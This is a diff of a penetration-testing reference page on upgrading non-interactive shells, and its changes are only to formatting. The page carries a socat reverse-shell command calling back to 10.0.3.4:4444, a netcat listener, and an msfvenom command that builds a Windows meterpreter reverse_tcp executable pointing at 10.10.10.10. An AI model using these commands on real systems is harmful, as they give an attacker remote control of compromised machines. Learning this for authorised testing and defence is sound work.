@@ -1,8 +1,6 @@
 ```table-of-contents
 ```
 
-[[__TOC__]]
-
 Most [netcat](../Tools/netcat.md)-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or `su` and `sudo` tend to work poorly, if at all. Non-interactive shells also lack useful features like tab completion and job control. It is always a good idea upgrade any non-interactive shell to an interactive one.
 
 # Linux
@@ -14,7 +12,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-## TERM and SHELL exports
+## TERM and SHELL Exports
 
 ```bash
 SHELL=/bin/bash script -q /dev/null
@@ -25,7 +23,7 @@ export SHELL=bash
 export TERM=xterm-256color
 ```
 
-## socat
+## Socat
 
 ```bash
 #Listener:
@@ -35,7 +33,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 
-## Fix rows and columns
+## Fix Rows and Columns
 
 From a clean terminal:
 
@@ -70,7 +68,7 @@ stty rows 60 columns 235
 └─$ rlwrap nc -nlvp 443
 ```
 
-## meterpreter
+## Meterpreter
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=10099 -f exe -o meter.exe
